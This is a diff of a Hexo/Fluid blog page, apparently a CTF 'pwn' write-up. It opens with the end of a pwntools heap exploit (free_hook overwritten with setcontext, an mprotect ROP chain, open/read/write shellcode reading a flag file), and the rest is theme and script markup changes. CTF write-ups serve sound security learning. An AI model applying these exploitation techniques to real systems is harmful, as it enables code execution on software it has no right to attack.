+set_context = libc.sym[&apos;setcontext&apos;] + 53 + libc_base
+info_addr(&apos;heap_base&apos;,heap_base)
+info_addr(&apos;context&apos;,set_context)
+orw = shellcraft.open(&apos;./flag&apos;)
+orw +=shellcraft.read(&apos;rax&apos;,heap_base+0x300,0x30)
 orw +=shellcraft.write(1,heap_base+0x300,0x30)
 edit(11,asm(orw))
 # debug()
@@ -457,8 +508,8 @@ free(2)
 free(2)
 # debug()
 add(p64(free_hook))
-add(&#39;1&#39;*6)
-info_addr(&#39;context&#39;,set_context)
+add(&apos;1&apos;*6)
+info_addr(&apos;context&apos;,set_context)
 add(p64(set_context))
 # debug()
 free(1)
@@ -467,59 +518,79 @@ pop_rsi = 0x0000000000023e8a+libc_base
 pop_rdx = libc_base+0x0000000000001b96
 pop_rax = libc_base+0x0000000000043a78
 
-payload = flat([pop_rdi,heap_base-0x250,pop_rsi,0x1000,pop_rdx,7,libc_base+libc.sym[&#39;mprotect&#39;],heap_base+0x80])
+payload = flat([pop_rdi,heap_base-0x250,pop_rsi,0x1000,pop_rdx,7,libc_base+libc.sym[&apos;mprotect&apos;],heap_base+0x80])
 s(payload)
-itr()</code></pre>
+itr()</code></pre></div></p>
 
+            </div>
             <hr>
-          </div>
-          <br>
-          <div>
-            <p>
-            
-            
-              <span>
-                <i class="iconfont icon-tag"></i>
+            <div>
+              <div class="post-metas mb-3">
                 
-                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
                 
-              </span>
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/09/House of Spirit/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">House of Spirit</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/06/mac 上ida 7.0 闪退 打不开 解决办法/">
+                        <span class="hidden-mobile">mac 上ida 7.0 闪退 打不开 解决办法</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
             
-            </p>
-            
-              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
-            
-          </div>
+          </article>
         </div>
       </div>
     </div>
-    <div class="d-none d-lg-block col-lg-2 toc-container">
-      
-  <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
-    <div id="tocbot"></div>
-  </div>
-
-    </div>
-  </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
 </div>
 
-<!-- custom -->
-
-
-<!-- Comments -->
-<div class="col-lg-7 mx-auto nopadding-md">
-  <div class="container comments mx-auto" id="comments">
+      </div>
     
   </div>
 </div>
+
+<!-- Custom -->
+
 
     
   </main>
 
   
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
     </a>
   
 
@@ -547,92 +618,100 @@ itr()</code></pre>
 </div>
   
 
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-    <i class="iconfont icon-love"></i>
-    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
-    <br>
-
-    
   
-    <!-- 不蒜子统计PV -->
-    
-    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
-          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
-  
-  
-    <!-- 不蒜子统计UV -->
-    
-    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
-            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
-  
-  <br>
 
-
-
-    
-
-
-    <!-- cnzz Analytics icon -->
-    
-
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
   </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
 </footer>
 
 <!-- SCRIPTS -->
-<script src="/lib/jquery/jquery.min.js" ></script>
-<script src="/lib/popper/popper.min.js" ></script>
-<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
-<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
-<script src="/js/main.js" ></script>
-
-
-  <script src="/js/lazyload.js" ></script>
-
-
-
-  
-    <script src="/lib/tocbot/tocbot.min.js" ></script>
-  
-  <script src="/js/post.js" ></script>
-
-
-
-  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>
-
-
-
-  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
 <!-- Plugins -->
 
 
   
-
-  
-
-  
-
-  
-
-  <!-- cnzz Analytics -->
+    <script  src="/js/lazyload.js" ></script>
   
 
 
 
-  <script src="/lib/prettify/prettify.min.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
   <script>
     $(document).ready(function () {
-      $('pre').addClass('prettyprint  linenums');
-      prettyPrint();
-    })
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
   </script>
 
 
 
-  <script src="/lib/typed/typed.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
   <script>
     var typed = new Typed('#subtitle', {
       strings: [
@@ -652,11 +731,13 @@ itr()</code></pre>
 
 
 
-  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
   <script>
     anchors.options = {
-      placement: "right",
-      visible: "false",
+      placement: "left",
+      visible: "hover",
+      
+      icon: "#"
       
     };
     var el = "h1,h2,h3,h4,h5,h6".split(",");
@@ -669,25 +750,27 @@ itr()</code></pre>
 
 
 
-  <script src="/js/local-search.js" ></script>
+  <script  src="/js/local-search.js" ></script>
   <script>
     var path = "/local-search.xml";
     var inputArea = document.querySelector("#local-search-input");
     inputArea.onclick = function () {
-      getSearchFile(path);
+      searchFunc(path, 'local-search-input', 'local-search-result');
       this.onclick = null
     }
   </script>
 
 
 
-  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
   <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
       function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
         $(this).wrap(element);
       }
     );
@@ -697,58 +780,24 @@ itr()</code></pre>
 
 
 
-  
-  
-    <script type="text/javascript">
-      //定义获取词语下标
-      var a_idx = 0;
-      jQuery(document).ready(function ($) {
-        //点击body时触发事件
-        $("body").click(function (e) {
-          //需要显示的词语
-          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
-          //设置词语给span标签
-          var $i = $("<span/>").text(a[a_idx]);
-          //下标等于原来下标+1  余 词语总数
-          a_idx = (a_idx + 1) % a.length;
-          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
-          //获取x和y的指针坐标
-          var x = e.pageX, y = e.pageY;
-          //在鼠标的指针的位置给$i定义的span标签添加css样式
-          $i.css({
-            "z-index": 999,
-            "top": y - 20,
-            "left": x,
-            "position": "absolute",
-            "font-weight": "bold",
-            "color": rand_color()
-          });
-          // 随机颜色
-          function rand_color() {
-            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
-          }
-          //在body添加这个标签
-          $("body").append($i);
-          //animate() 方法执行 CSS 属性集的自定义动画。
-          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
-          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
-          $i.animate({
-            //将原来的位置向上移动180
-            "top": y - 180,
-            "opacity": 0
-            //1500动画的速度
-          }, 1500, function () {
-            //时间到了自动删除
-            $i.remove();
-          });
-        });
-      })
-      ;
-    </script>
-  
 
 
 
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
 
 
 
